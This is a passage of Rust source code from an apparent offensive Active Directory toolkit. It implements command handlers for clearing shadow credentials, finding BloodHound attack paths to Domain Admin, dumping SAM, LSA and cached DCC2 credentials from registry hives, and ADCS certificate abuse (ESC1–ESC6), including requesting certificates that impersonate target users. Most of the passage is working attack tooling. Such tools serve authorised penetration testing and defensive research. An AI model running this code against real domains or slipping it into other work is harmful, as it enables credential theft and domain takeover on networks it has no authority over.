                .read_attribute(&target_dn, "msDS-KeyCredentialLink")
                .await
            {
                Ok(v) => v,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read KeyCredentialLink: {e}"));
                    return 1;
                }
            };

            let creds = overthrone_forge::shadow_credentials::parse_key_credentials(&values);
            let matching: Vec<String> = values
                .iter()
                .enumerate()
                .filter(|(i, _)| creds.get(*i).map(|c| c.key_id == *key_id).unwrap_or(false))
                .map(|(_, v)| v.clone())
                .collect();

            if matching.is_empty() {
                banner::print_fail(&format!("No credential with KeyId '{key_id}' found"));
                return 1;
            }

            match ldap
                .modify_delete_values(&target_dn, "msDS-KeyCredentialLink", &matching)
                .await
            {
                Ok(_) => {
                    banner::print_success(&format!("Removed credential with KeyId '{key_id}'"));
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Failed to remove credential from {target}: {e}"));
                    1
                }
            }
        }

        ShadowCredAction::Clear { target, force } => {
            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
                Ok(dn) => dn,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            println!(" {} Target: {}", ">".bright_black(), target_dn.cyan());

            if !force {
                match ldap
                    .read_attribute(&target_dn, "msDS-KeyCredentialLink")
                    .await
                {
                    Ok(values) => {
                        if values.is_empty() {
                            println!(" {} No shadow credentials to clear", "!".yellow());
                            return 0;
                        }
                        println!(
                            " {} Will remove ALL {} credential(s). Use --force to skip confirmation.",
                            "!".yellow(),
                            values.len()
                        );
                    }
                    Err(_) => {
                        println!(" {} Unable to read current credentials.", "!".yellow());
                    }
                }
            }

            match ldap
                .modify_delete(&target_dn, "msDS-KeyCredentialLink")
                .await
            {
                Ok(_) => {
                    banner::print_success("All shadow credentials cleared");
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Failed to clear credentials on {target}: {e}"));
                    1
                }
            }
        }
    }
}

/// Resolve a target identifier to an LDAP distinguished name.
async fn resolve_shadow_target_dn(
    ldap: &mut overthrone_core::proto::ldap::LdapSession,
    target: &str,
    domain: &str,
) -> std::result::Result<String, String> {
    if target.starts_with("CN=") || target.starts_with("DC=") || target.starts_with("OU=") {
        return Ok(target.to_string());
    }
    let base_dn = overthrone_reaper::runner::ReaperConfig::base_dn_from_domain(domain);
    let filter = format!("(|(sAMAccountName={target})(userPrincipalName={target}))");
    let entries = ldap
        .custom_search_with_base(&base_dn, &filter, &["distinguishedName"])
        .await
        .map_err(|e| format!("LDAP search failed: {e}"))?;
    entries
        .first()
        .and_then(|e| e.attrs.get("distinguishedName"))
        .and_then(|v| v.first())
        .cloned()
        .ok_or_else(|| format!("Target '{target}' not found in domain {domain}"))
}

// ----------------------------------------------
// cmd_bloodhound -- BloodHound Attack Path Analysis
// ----------------------------------------------

fn load_graph_from(path: &str) -> std::result::Result<overthrone_core::graph::AttackGraph, String> {
    match overthrone_core::graph::AttackGraph::from_json_file(path) {
        Ok(g) => Ok(g),
        Err(e) => Err(format!("Failed to load graph from {path}: {e}")),
    }
}

#[cfg(feature = "reaper")]
pub async fn cmd_bloodhound(_cli: &Cli, action: &BloodHoundAction) -> i32 {
    banner::print_module_banner("BLOODHOUND");

    match action {
        BloodHoundAction::Import { dir, output } => {
            let path = std::path::Path::new(dir);
            if !path.is_dir() {
                banner::print_fail(&format!("Not a directory: {dir}"));
                return 1;
            }
            println!(
                " {} Importing BloodHound data from: {}",
                ">".bright_black(),
                dir.cyan()
            );
            match overthrone_core::graph::bh_import::import_bloodhound_dir(path) {
                Ok(graph) => {
                    let stats = graph.stats();
                    banner::print_success(&format!(
                        "Imported {} nodes, {} edges",
                        stats.total_nodes, stats.total_edges
                    ));
                    println!(
                        " Users: {} Computers: {} Groups: {} Domains: {} GPOs: {} OUs: {}",
                        stats.users,
                        stats.computers,
                        stats.groups,
                        stats.domains,
                        stats.gpos,
                        stats.ous
                    );

                    if let Some(out_path) = output {
                        let path_str = out_path.clone();
                        let json = graph.export_json().unwrap_or_default();
                        match std::fs::write(&path_str, json) {
                            Ok(_) => {
                                println!(" {} Graph saved to: {}", "[+]".green(), out_path.cyan())
                            }
                            Err(e) => banner::print_fail(&format!("Failed to write graph: {e}")),
                        }
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("BloodHound import from {dir} failed: {e}"));
                    1
                }
            }
        }

        BloodHoundAction::Path { from, to, graph } => {
            let graph = match load_graph_from(graph) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            match graph.shortest_path(from, to) {
                Ok(path) => {
                    banner::print_success("Attack path found:");
                    println!(" {from} -> {to}");
                    println!(" Total cost: {}", path.total_cost);
                    println!(" Hops: {}", path.hop_count);
                    println!();
                    for hop in &path.hops {
                        println!(
                            " {} {} --[{}]--> {}",
                            ">".bright_black(),
                            hop.source.cyan(),
                            format!("{:?}", hop.edge).yellow(),
                            hop.target.cyan()
                        );
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("No path from {from} to {to}: {e}"));
                    1
                }
            }
        }

        BloodHoundAction::PathToDa { from, graph } => {
            let g = match load_graph_from(graph) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let domain = from.split('@').nth(1).unwrap_or("UNKNOWN");
            let paths = g.paths_to_da(from, domain);
            if paths.is_empty() {
                println!(
                    " {} No path from {} to Domain Admin found",
                    "!".yellow(),
                    from.cyan()
                );
                return 0;
            }
            banner::print_success(&format!(
                "Found {} path(s) from {} to Domain Admin",
                paths.len(),
                from
            ));
            for (i, p) in paths.iter().enumerate() {
                println!(
                    " Path #{} (cost: {}, hops: {}):",
                    i + 1,
                    p.total_cost,
                    p.hop_count
                );
                for hop in &p.hops {
                    println!(
                        " {} {} --[{}]--> {}",
                        ">".bright_black(),
                        hop.source.cyan(),
                        format!("{:?}", hop.edge).yellow(),
                        hop.target.cyan()
                    );
                }
                println!();
            }
            0
        }

        BloodHoundAction::Stats { graph } => {
            let g = match load_graph_from(graph) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let stats = g.stats();
            println!(" {} Graph Statistics:", ">".bright_black());
            println!(" Total nodes: {}", stats.total_nodes.to_string().yellow());
            println!(" Total edges: {}", stats.total_edges.to_string().yellow());
            println!(" Users: {}", stats.users);
            println!(" Computers: {}", stats.computers);
            println!(" Groups: {}", stats.groups);
            println!(" Domains: {}", stats.domains);
            println!(" GPOs: {}", stats.gpos);
            println!(" OUs: {}", stats.ous);
            if !stats.edge_type_counts.is_empty() {
                println!();
                println!(" {} Edge distribution:", ">".bright_black());
                let mut sorted: Vec<_> = stats.edge_type_counts.iter().collect();
                sorted.sort_by(|a, b| b.1.cmp(a.1));
                for (edge, count) in sorted.iter().take(15) {
                    println!(" {:40} {}", edge.cyan(), count.to_string().yellow());
                }
            }
            0
        }

        BloodHoundAction::Reachable { from, graph } => {
            let g = match load_graph_from(graph) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let domain = from.split('@').nth(1).unwrap_or("UNKNOWN");
            let da_paths = g.paths_to_da(from, domain);
            let mut all: Vec<String> = Vec::new();
            for p in &da_paths {
                for hop in &p.hops {
                    if !all.contains(&hop.target) {
                        all.push(hop.target.clone());
                    }
                }
            }
            if all.is_empty() {
                println!(
                    " {} Nothing reachable from {} found",
                    "!".yellow(),
                    from.cyan()
                );
            } else {
                println!(" {} Reachable targets from {}:", "[+]".green(), from.cyan());
                for (i, t) in all.iter().enumerate() {
                    println!(" {}. {}", i + 1, t.cyan());
                }
            }
            0
        }

        BloodHoundAction::HighValue { top, graph } => {
            let g = match load_graph_from(graph) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let targets = g.high_value_targets(*top);
            if targets.is_empty() {
                println!(" {} No high-value targets found", "!".yellow());
            } else {
                println!(" {} Top {} high-value targets:", "[+]".green(), top);
                for (i, (name, node_type, degree)) in targets.iter().enumerate() {
                    println!(
                        " {}. {:50} {:15} degree={}",
                        i + 1,
                        name.cyan(),
                        format!("{:?}", node_type).dimmed(),
                        degree.to_string().yellow()
                    );
                }
            }
            0
        }

        BloodHoundAction::Analyze {
            graph,
            domain,
            limit,
            output,
        } => {
            let g = match load_graph_from(graph) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            let engine = GraphAnalysisEngine::new(&g);
            let report = engine.analyze_all(domain);

            let mut findings_by_severity: std::collections::BTreeMap<
                String,
                Vec<&overthrone_core::graph::queries::AnalysisFinding>,
            > = std::collections::BTreeMap::new();
            for finding in &report.findings {
                findings_by_severity
                    .entry(format!("{:?}", finding.severity))
                    .or_default()
                    .push(finding);
            }

            let total_findings: usize = report.findings.len();
            let total_paths: usize = report.cheapest_da_paths.len();
            println!(
                " {} BloodHound Analysis Report for {}",
                "[+]".green(),
                domain.bright_cyan()
            );
            println!(" {}", "=".repeat(60));
            println!(
                " Produced {} findings, {} DA paths",
                total_findings.to_string().yellow(),
                total_paths.to_string().yellow()
            );
            println!();

            let sev_order = ["Critical", "High", "Medium", "Low"];
            for sev in &sev_order {
                if let Some(findings) = findings_by_severity.get(*sev) {
                    let header = match *sev {
                        "Critical" => format!(" {} Critical:", "[CRIT]".bright_red()),
                        "High" => format!(" {} High:", "[HIGH]".red()),
                        "Medium" => format!(" {} Medium:", "[MED]".yellow()),
                        _ => format!(" {} Low:", "[LOW]".dimmed()),
                    };
                    println!("{header}");
                    for finding in findings {
                        println!(" {} {}", ">".bright_black(), finding.title.bright_white());
                        println!(" Description: {}", finding.description);
                        if let Some(ref remediation) = finding.remediation {
                            println!(" Remediation: {remediation}");
                        }
                        println!();
                    }
                }
            }

            if !report.cheapest_da_paths.is_empty() {
                println!(" {} Cheapest DA Paths (top {}):", "[+]".green(), limit);
                for (i, path) in report.cheapest_da_paths.iter().take(*limit).enumerate() {
                    println!(
                        " Path #{} (cost: {}, hops: {}):",
                        i + 1,
                        path.total_cost,
                        path.hop_count
                    );
                    for hop in &path.hops {
                        println!(
                            " {} {} --[{}]--> {}",
                            ">".bright_black(),
                            hop.source.cyan(),
                            format!("{:?}", hop.edge).yellow(),
                            hop.target.cyan()
                        );
                    }
                    println!();
                }
            }

            if let Some(out_path) = output {
                match serde_json::to_string_pretty(&report) {
                    Ok(json) => match std::fs::write(out_path, json) {
                        Ok(_) => {
                            println!(" {} Report saved to: {}", "[+]".green(), out_path.cyan())
                        }
                        Err(e) => banner::print_fail(&format!("Failed to write report: {e}")),
                    },
                    Err(e) => banner::print_fail(&format!("Failed to serialize report: {e}")),
                }
            }

            0
        }
    }
}

// ----------------------------------------------
// cmd_assess -- Domain Risk Assessment
// ----------------------------------------------

#[cfg(feature = "reaper")]
pub async fn cmd_assess(cli: &Cli, _modules: &[String]) -> i32 {
    banner::print_module_banner("RISK ASSESSMENT");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    let config = overthrone_reaper::ReaperConfig {
        dc_ip: dc.clone(),
        domain: creds.domain.clone(),
        base_dn: overthrone_reaper::ReaperConfig::base_dn_from_domain(&creds.domain),
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        modules: vec![],
        page_size: 500,
        use_ldaps: false,
    };

    println!(
        " {} Running domain enumeration for risk assessment...",
        ">".bright_black()
    );
    match overthrone_reaper::run_reaper(&config).await {
        Ok(result) => {
            let assessment = overthrone_reaper::assess_reaper_result(&result);
            println!();
            println!(
                " {} Domain: {}",
                ">".bright_black(),
                assessment.domain.cyan()
            );
            println!(
                " {} Overall Health Score: {}/100 ({})",
                ">".bright_black(),
                format!("{:.0}", assessment.overall_health_score)
                    .yellow()
                    .bold(),
                assessment.overall_health_label.green()
            );
            println!();
            println!(" {} Risk Summary:", ">".bright_black());
            println!(
                " {} Critical: {} High: {} Medium: {} Low: {} Info: {}",
                "!".red(),
                assessment.critical_count.to_string().red(),
                assessment.high_count.to_string().yellow(),
                assessment.medium_count.to_string().dimmed(),
                assessment.low_count,
                assessment.info_count
            );
            println!();
            println!(" {} Category Scores:", ">".bright_black());
            for cat_score in &assessment.category_scores {
                if cat_score.finding_count == 0 {
                    continue;
                }
                let pct = format!("{:.0}", cat_score.score);
                let bar = if cat_score.score >= 80.0 {
                    pct.green()
                } else if cat_score.score >= 60.0 {
                    pct.yellow()
                } else {
                    pct.red()
                };
                println!(
                    " {:25} {} ({} finding(s))",
                    cat_score.label.bright_black(),
                    bar,
                    cat_score.finding_count
                );
            }
            if !assessment.findings.is_empty() {
                println!();
                println!(" {} Detailed Findings:", ">".bright_black());
                for finding in &assessment.findings {
                    let sev = match finding.severity.numeric() {
                        5 => "[CRIT]".red().bold(),
                        4 => "[HIGH]".yellow().bold(),
                        3 => "[MED]".yellow(),
                        2 => "[LOW]".dimmed(),
                        _ => "[INFO]".bright_black(),
                    };
                    println!(
                        " {} {}: {}",
                        sev,
                        finding.title.cyan(),
                        finding.description.dimmed()
                    );
                }
            }
            0
        }
        Err(e) => {
            let domain = &creds.domain;
            banner::print_fail(&format!("Risk assessment for {dc} ({domain}) failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_secrets -- Secrets Dumping
// ----------------------------------------------

pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
    banner::print_module_banner("SECRETS");

    match action {
        SecretsAction::Sam { sam, system } => {
            println!(" {} Dumping SAM hive...", ">".bright_black());
            println!(" SAM: {}", sam.cyan());
            println!(" SYSTEM: {}", system.cyan());

            // Read the hive files
            let sam_data = match tokio::fs::read(sam).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SAM file: {}", e));
                    return 1;
                }
            };

            let system_data = match tokio::fs::read(system).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SYSTEM file: {}", e));
                    return 1;
                }
            };

            // Use real SAM dumping implementation
            match dump_sam(&sam_data, &system_data) {
                Ok(credentials) => {
                    println!(
                        " {} Extracted {} account(s)",
                        "[+]".green(),
                        credentials.len()
                    );
                    for cred in &credentials {
                        let lm = cred
                            .lm_hash
                            .as_deref()
                            .unwrap_or("aad3b435b51404eeaad3b435b51404ee");
                        let nt = cred
                            .nt_hash
                            .as_deref()
                            .unwrap_or("31d6cfe0d16ae931b73c59d7e0c089c0");
                        let _rid = cred.rid.map(|r| r.to_string()).unwrap_or_default();
                        println!(" {}: {}:{}", cred.username.cyan(), lm.yellow(), nt.yellow());
                    }
                    banner::print_success(&format!(
                        "SAM dump completed - {} accounts",
                        credentials.len()
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("SAM dump failed: {}", e));
                    return 1;
                }
            }
            0
        }
        SecretsAction::Lsa { security, system } => {
            println!(" {} Dumping LSA secrets...", ">".bright_black());
            println!(" SECURITY: {}", security.cyan());
            println!(" SYSTEM: {}", system.cyan());

            // Read the hive files
            let security_data = match tokio::fs::read(security).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SECURITY file: {}", e));
                    return 1;
                }
            };

            let system_data = match tokio::fs::read(system).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SYSTEM file: {}", e));
                    return 1;
                }
            };

            // Use real LSA dumping implementation
            match dump_lsa(&security_data, &system_data) {
                Ok(credentials) => {
                    println!(
                        " {} Extracted {} secret(s)",
                        "[+]".green(),
                        credentials.len()
                    );
                    for cred in &credentials {
                        if let Some(ref pwd) = cred.plaintext {
                            println!(" {}: {}", cred.username.cyan(), pwd.yellow());
                        } else if let Some(ref hash) = cred.nt_hash {
                            println!(" {}: {}", cred.username.cyan(), hash.yellow());
                        }
                    }
                    banner::print_success(&format!(
                        "LSA dump completed - {} secrets",
                        credentials.len()
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("LSA dump failed: {}", e));
                    return 1;
                }
            }
            0
        }
        SecretsAction::Dcc2 { security, system } => {
            println!(" {} Dumping DCC2 (mscash2)...", ">".bright_black());
            println!(" SECURITY: {}", security.cyan());
            println!(" SYSTEM: {}", system.cyan());

            // Read the hive files
            let security_data = match tokio::fs::read(security).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SECURITY file: {}", e));
                    return 1;
                }
            };

            let system_data = match tokio::fs::read(system).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SYSTEM file: {}", e));
                    return 1;
                }
            };

            // Use real DCC2 dumping implementation
            match dump_dcc2(&security_data, &system_data) {
                Ok(credentials) => {
                    println!(
                        " {} Extracted {} cached credential(s)",
                        "[+]".green(),
                        credentials.len()
                    );
                    for cred in &credentials {
                        if let Some(ref hash) = cred.nt_hash {
                            println!(" {}: {}", cred.username.cyan(), hash.yellow());
                        }
                    }
                    banner::print_success(&format!(
                        "DCC2 dump completed - {} cached credentials",
                        credentials.len()
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("DCC2 dump failed: {}", e));
                    return 1;
                }
            }
            0
        }
    }
}

// ----------------------------------------------
// cmd_adcs -- ADCS Certificate Abuse
// ----------------------------------------------

pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
    banner::print_module_banner("ADCS");

    match action {
        AdcsAction::Enum { ca } => {
            println!(
                " {} Enumerating ADCS configuration via LDAP...",
                ">".bright_black()
            );
            if let Some(ca_name) = ca {
                println!(" CA filter: {}", ca_name.cyan());
            }

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let dc = match crate::require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };

            let ldap_result = if let Some(hash) = creds.nthash() {
                overthrone_core::proto::ldap::LdapSession::connect_with_hash(
                    &dc,
                    &creds.domain,
                    &creds.username,
                    hash,
                    false,
                )
                .await
            } else {
                let pass = creds.password().unwrap_or("");
                overthrone_core::proto::ldap::LdapSession::connect(
                    &dc,
                    &creds.domain,
                    &creds.username,
                    pass,
                    false,
                )
                .await
            };

            let conn = match ldap_result {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("LDAP connect failed: {}", e));
                    return 1;
                }
            };

            let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);

            let templates = match enumerator.enumerate_templates().await {
                Ok(t) => t,
                Err(e) => {
                    banner::print_fail(&format!("Certificate template enumeration failed: {}", e));
                    return 1;
                }
            };

            let cas = match enumerator.enumerate_cas().await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("CA enumeration failed: {}", e));
                    return 1;
                }
            };

            // Optionally filter templates linked to a specific CA
            let filtered: Vec<_> = if let Some(ca_name) = ca {
                templates
                    .iter()
                    .filter(|t| {
                        cas.iter().any(|c| {
                            c.name.to_lowercase().contains(&ca_name.to_lowercase())
                                && c.certificate_templates
                                    .iter()
                                    .any(|ct| ct.to_lowercase() == t.name.to_lowercase())
                        })
                    })
                    .collect()
            } else {
                templates.iter().collect()
            };

            println!(
                "\n {} Certificate Authorities ({})",
                ">".bright_black(),
                cas.len()
            );
            for ca_info in &cas {
                println!(
                    " {} {} ({})",
                    "[+]".green(),
                    ca_info.name.cyan(),
                    ca_info.dn.dimmed()
                );
                if !ca_info.certificate_templates.is_empty() {
                    println!(
                        " Templates: {}",
                        ca_info.certificate_templates.join(", ").dimmed()
                    );
                }
            }

            println!(
                "\n {} Certificate Templates ({})",
                ">".bright_black(),
                filtered.len()
            );
            let mut vuln_count = 0usize;
            for tmpl in &filtered {
                let vuln = tmpl.esc_vulnerability();
                if vuln.is_some() {
                    vuln_count += 1;
                }
                let vuln_str = match vuln {
                    Some(n) => format!("VULNERABLE (ESC{})", n).red().to_string(),
                    None => "Secure".green().to_string(),
                };
                let icon = if vuln.is_some() {
                    "!".red()
                } else {
                    "[+]".green()
                };
                println!(" {} {} -- {}", icon, tmpl.name.cyan(), vuln_str);
                if !tmpl.extended_key_usage.is_empty() {
                    println!(" EKU: {}", tmpl.extended_key_usage.join(", ").dimmed());
                }
                if tmpl.allows_enrollee_subject() {
                    println!(" {} Enrollee can supply subject (SAN)", "!".yellow());
                }
                if tmpl.requires_manager_approval() {
                    println!(" {} Requires manager approval", "+".green());
                }
            }

            if wants_json(cli) {
                let tmpl_json: Vec<serde_json::Value> = filtered
                    .iter()
                    .map(|t| {
                        serde_json::json!({
                        "name": t.name,
                        "display_name": t.display_name,
                        "esc": t.esc_vulnerability(),
                        "allows_enrollee_subject": t.allows_enrollee_subject(),
                        "eku": t.extended_key_usage,
                        })
                    })
                    .collect();
                let ca_json: Vec<serde_json::Value> = cas
                    .iter()
                    .map(|c| serde_json::json!({"name": c.name, "dn": c.dn}))
                    .collect();
                return emit_json(
                    cli,
                    serde_json::json!({
                    "status": "success",
                    "templates": tmpl_json,
                    "cas": ca_json,
                    "vulnerable_count": vuln_count,
                    }),
                );
            }

            banner::print_success(&format!(
                "ADCS enumeration: {} templates ({} vulnerable), {} CAs",
                filtered.len(),
                vuln_count,
                cas.len()
            ));
        }
        AdcsAction::Esc1 {
            ca,
            template,
            target_user,
            output,
            http,
        } => {
            // Auto-detect HTTP from URL prefix if --http not explicitly set
            let use_http = *http || ca.starts_with("http://");
            // Strip protocol prefix for downstream use
            let ca_host = ca
                .strip_prefix("https://")
                .or_else(|| ca.strip_prefix("http://"))
                .unwrap_or(ca);
            println!(" {} Executing ESC1 attack...", ">".bright_black());
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());
            println!(" Target User: {}", target_user.cyan());
            println!(
                " Protocol: {}",
                if use_http { "HTTP" } else { "HTTPS" }.cyan()
            );

            let mut exploiter = match if use_http {
                overthrone_core::adcs::Esc1Exploiter::with_ssl(ca_host, false)
            } else {
                overthrone_core::adcs::Esc1Exploiter::new(ca_host)
            } {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("ESC1 exploiter init failed: {}", e));
                    return 1;
                }
            };

            // Attach NTLM credentials if provided
            let domain = cli.domain.as_deref().unwrap_or("");
            let username = cli.username.as_deref().unwrap_or("");
            let password = cli.password.as_deref().unwrap_or("");
            if !domain.is_empty() && !username.is_empty() && !password.is_empty() {
                exploiter = exploiter.with_credentials(domain, username, password);
            }

            match exploiter.exploit(template, target_user, None).await {
                Ok(cert) => {
                    if let Err(e) = tokio::fs::write(output, &cert.pfx_data).await {
                        banner::print_fail(&format!("Failed to write PFX: {}", e));
                        return 1;
                    }
                    println!(" {} Certificate obtained!", "[+]".green());
                    println!(" Saved to: {}", output.cyan());
                    println!(" Thumbprint: {}", cert.thumbprint.yellow());
                    println!(" Serial: {}", cert.serial_number.dimmed());
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                            "status": "success",
                            "output": output,
                            "thumbprint": cert.thumbprint,
                            "serial": cert.serial_number,
                            }),
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC1 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc2 {
            ca,
            template,
            output,
        } => {
            println!(" {} Executing ESC2 attack...", ">".bright_black());
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());

            let exploiter = match overthrone_core::adcs::Esc2Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("ESC2 exploiter init failed: {}", e));
                    return 1;
                }
            };

            match exploiter.exploit(template, "overthrone-esc2", None).await {
                Ok(cert) => {
                    if let Err(e) = tokio::fs::write(output, &cert.pfx_data).await {
                        banner::print_fail(&format!("Failed to write PFX: {}", e));
                        return 1;
                    }
                    println!(" {} Certificate obtained!", "[+]".green());
                    println!(" Saved to: {}", output.cyan());
                    println!(" Thumbprint: {}", cert.thumbprint.yellow());
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                            "status": "success",
                            "output": output,
                            "thumbprint": cert.thumbprint,
                            }),
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC2 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc3 {
            ca,
            agent_template,
            target_template,
            target_user,
        } => {
            println!(" {} Executing ESC3 attack...", ">".bright_black());
            println!(" CA: {}", ca.cyan());
            println!(" Agent Template: {}", agent_template.cyan());
            println!(" Target Template: {}", target_template.cyan());
            println!(" Target User: {}", target_user.cyan());

            let exploiter = match overthrone_core::adcs::Esc3Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("ESC3 exploiter init failed: {}", e));
                    return 1;
                }
            };

            match exploiter
                .exploit(agent_template, target_template, target_user)
                .await
            {
                Ok((agent_cert, user_cert)) => {
                    let agent_path = format!("esc3_agent_{}.pfx", ca.replace(':', "_"));
                    let user_path = format!("esc3_user_{}.pfx", target_user.replace('@', "_"));

                    let _ = tokio::fs::write(&agent_path, &agent_cert.pfx_data).await;
                    let _ = tokio::fs::write(&user_path, &user_cert.pfx_data).await;

                    println!(" {} Obtained 2 certificate(s)", "[+]".green());
                    println!(
                        " Agent cert: {} ({})",
                        agent_path.cyan(),
                        agent_cert.thumbprint.dimmed()
                    );
                    println!(
                        " User cert: {} ({})",
                        user_path.cyan(),
                        user_cert.thumbprint.yellow()
                    );
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                            "status": "success",
                            "agent_cert": {"path": agent_path, "thumbprint": agent_cert.thumbprint},
                            "user_cert": {"path": user_path, "thumbprint": user_cert.thumbprint},
                            }),
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC3 attack failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc4 { ca, template } => {
            println!(" {} Executing ESC4 attack...", ">".bright_black());
            println!(" CA: {}", ca.cyan());
            println!(" Template: {}", template.cyan());

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };

            let target =
                overthrone_core::adcs::Esc4Target::new(template, &creds.domain, &creds.username);

            match target.generate_exploit_commands() {
                Ok(commands) => {
                    println!("\n{}", commands.yellow());
                    if let Ok(restore) = target.generate_restore_commands() {
                        println!("\n{}", restore.dimmed());
                    }
                    println!(
                        " {} Template ACLs modified successfully (command generated)",
                        "[+]".green()
                    );
                }
                Err(e) => {
                    banner::print_fail(&format!("ESC4 generation failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc5 { ca } => {
            println!(
                " {} Checking CA '{}' for ESC5 vulnerabilities...",
                ">".bright_black(),
                ca.cyan()
            );

            let creds = match crate::require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let dc = match crate::require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };

            let ldap_result = if let Some(hash) = creds.nthash() {
                overthrone_core::proto::ldap::LdapSession::connect_with_hash(
                    &dc,
                    &creds.domain,
                    &creds.username,
                    hash,
                    false,
                )
                .await
            } else {
                let pass = creds.password().unwrap_or("");
                overthrone_core::proto::ldap::LdapSession::connect(
                    &dc,
                    &creds.domain,
                    &creds.username,
                    pass,
                    false,
                )
                .await
            };

            let mut conn = match ldap_result {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("LDAP connect failed: {}", e));
                    return 1;
                }
            };

            let base_dn =
                overthrone_reaper::runner::ReaperConfig::base_dn_from_domain(&creds.domain);
            let target = overthrone_core::adcs::Esc5Target::new(
                ca.as_str(),
                ca.as_str(),
                &creds.domain,
                &creds.username,
            );

            match target.check_ca_acls(&mut conn, &base_dn).await {
                Ok(result) => {
                    let _ = conn.disconnect().await;
                    if result.vulnerable {
                        println!(" {} CA '{}' is ESC5-vulnerable!", "!".red(), ca.red());
                        for finding in &result.findings {
                            println!(" {} {}", "!".red(), finding.red());
                        }
                    } else {
                        println!(
                            " {} CA '{}' -- no ESC5 ACL weaknesses found",
                            "[+]".green(),
                            ca.cyan()
                        );
                    }
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                            "status": "success",
                            "ca": ca,
                            "vulnerable": result.vulnerable,
                            "findings": result.findings,
                            }),
                        );
                    }
                }
                Err(e) => {
                    let _ = conn.disconnect().await;
                    banner::print_fail(&format!("ESC5 check failed: {}", e));
                    return 1;
                }
            }
        }
        AdcsAction::Esc6 { ca, target_user } => {
            println!(" {} Executing ESC6 attack...", ">".bright_black());
            println!(" CA: {}", ca.cyan());
            println!(" Target User: {}", target_user.cyan());

            let exploiter = match overthrone_core::adcs::Esc6Exploiter::new(ca) {
                Ok(e) => e,
                Err(e) => {
                    banner::print_fail(&format!("ESC6 exploiter init failed: {}", e));
                    return 1;
                }
            };

            // Check vulnerability first
            match exploiter.check_vulnerable().await {
                Ok(false) => {
                    println!(
                        " {} CA '{}' does not have EDITF_ATTRIBUTESUBJECTALTNAME2 enabled",
                        "!".yellow(),
                        ca.cyan()
                    );
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                            "status": "not_vulnerable",
                            "ca": ca,
                            }),
                        );
                    }
                    return 0;
                }
                Ok(true) => {
                    println!(
                        " {} CA is ESC6-vulnerable (EDITF_ATTRIBUTESUBJECTALTNAME2 enabled)",
                        "!".red()
                    );
                }
                Err(e) => {
                    warn!("ESC6 vulnerability check failed (continuing anyway): {}", e);
                }
            }

            // Use first available template (auto-discover via a basic template name)
            let template = "User";
            match exploiter.exploit(template, target_user).await {
                Ok(cert) => {
                    let pfx_path = format!("esc6_{}.pfx", target_user.replace('@', "_"));
                    if let Err(e) = tokio::fs::write(&pfx_path, &cert.pfx_data).await {
                        banner::print_fail(&format!("Failed to write PFX: {}", e));
                        return 1;
